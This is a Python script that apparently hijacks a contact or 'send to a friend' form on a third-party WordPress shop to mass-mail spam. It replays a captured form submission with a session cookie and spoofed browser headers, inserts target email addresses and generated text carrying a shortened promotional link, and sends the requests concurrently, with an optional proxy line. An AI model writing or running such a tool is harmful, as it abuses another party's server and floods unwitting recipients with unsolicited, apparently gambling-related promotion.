import requests

import module

url = 'https://dogtoysandproducts.com/woof-11/'
cookies = {
    'wp_wpfileupload_4186ca49f1d330386253d704608966c1': 'Om5r5nqp25pq5GLdFA3BKOjMe28xgQYC',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryArQXoo4ZynBSQsn0',
    'Origin': 'https://dogtoysandproducts.com',
    'Referer': 'https://dogtoysandproducts.com/woof-11/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

DATA = '------WebKitFormBoundaryArQXoo4ZynBSQsn0\r\nContent-Disposition: form-data; name="wp_iec_img"\r\n\r\n2853\r\n------WebKitFormBoundaryArQXoo4ZynBSQsn0\r\nContent-Disposition: form-data; name="wp_iec_post"\r\n\r\n2852\r\n------WebKitFormBoundaryArQXoo4ZynBSQsn0\r\nContent-Disposition: form-data; name="wp_iec_unique_id"\r\n\r\n0\r\n------WebKitFormBoundaryArQXoo4ZynBSQsn0\r\nContent-Disposition: form-data; name="wp_iec_ajax_validated"\r\n\r\n1\r\n------WebKitFormBoundaryArQXoo4ZynBSQsn0\r\nContent-Disposition: form-data; name="wp_iec_action"\r\n\r\nprocess_from\r\n------WebKitFormBoundaryArQXoo4ZynBSQsn0\r\nContent-Disposition: form-data; name="wp_iec_name"\r\n\r\ntest\r\n------WebKitFormBoundaryArQXoo4ZynBSQsn0\r\nContent-Disposition: form-data; name="wp_iec_email"\r\n\r\nsoftumwork@gmail.com\r\n------WebKitFormBoundaryArQXoo4ZynBSQsn0\r\nContent-Disposition: form-data; name="wp_iec_fname"\r\n\r\ntest\r\n------WebKitFormBoundaryArQXoo4ZynBSQsn0\r\nContent-Disposition: form-data; name="wp_iec_femail"\r\n\r\nsoftumwork@gmail.com\r\n------WebKitFormBoundaryArQXoo4ZynBSQsn0\r\nContent-Disposition: form-data; name="wp_iec_message"\r\n\r\ntest\r\n------WebKitFormBoundaryArQXoo4ZynBSQsn0\r\nContent-Disposition: form-data; name="wp_iec_scopy"\r\n\r\n1\r\n------WebKitFormBoundaryArQXoo4ZynBSQsn0--\r\n'


class ConcreteSpam(module.Spam):

    def post(self, target) -> requests.Response:
        data = DATA.replace('softumwork@gmail.com', target).replace('test', self.get_text())

        response = requests.post(url, cookies=cookies, headers=headers, data=data.encode(),
                                 # proxies=self.get_proxies(),
                                 )
        return response


if __name__ == '__main__':
    project_name = 'dogtoysandproducts'
    s = 'thankyou_redirect'

    project = 'supercat'  # supercat luckybird allright fortuneclock
    promo_link = 'bit.ly/3VZ42cw'
    spam = ConcreteSpam(
        project_name, s,
        referal_project_name=project,
        promo_link=promo_link,
    )
    res = spam.send_post()
    if res:
        spam.run_concurrently(10)
